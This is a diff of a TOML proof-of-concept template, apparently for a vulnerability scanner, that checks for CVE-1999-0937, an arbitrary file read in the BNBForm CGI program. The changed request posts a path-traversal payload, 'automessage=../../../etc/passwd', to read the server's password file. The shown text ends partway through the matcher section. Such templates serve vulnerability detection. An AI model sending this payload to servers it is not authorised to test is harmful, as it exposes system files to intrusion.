@@ -1,30 +1,29 @@
 [info]
 author = "AVE"
-description = "检测 BNBForm CGI 程序 automessage 隐藏表单变量导致的任意文件读取漏洞"
-id = "POC-AVE-1999-00001"
-name = "CVE-1999-0937 PoC"
+description = "BNBForm CGI 程序 automessage 隐藏表单变量存在路径遍历漏洞，远程攻击者可读取服务器任意文件"
+id = "POC-AVE-1999-1231"
+name = "BNBForm 任意文件读取漏洞 PoC"
 severity = "critical"
 tags = ["cve-1999-0937"]
 vuln_id = [
     "CVE-1999-0937",
-    "AVE-1999-00001",
+    "AVE-1999-1231",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/BNBForm"
+path = "/{{BaseURL}}/cgi-bin/bnbform.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "automessage=/etc/passwd"
+content = "automessage=../../../etc/passwd&recipient=test@test.com&subject=test&message=test"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
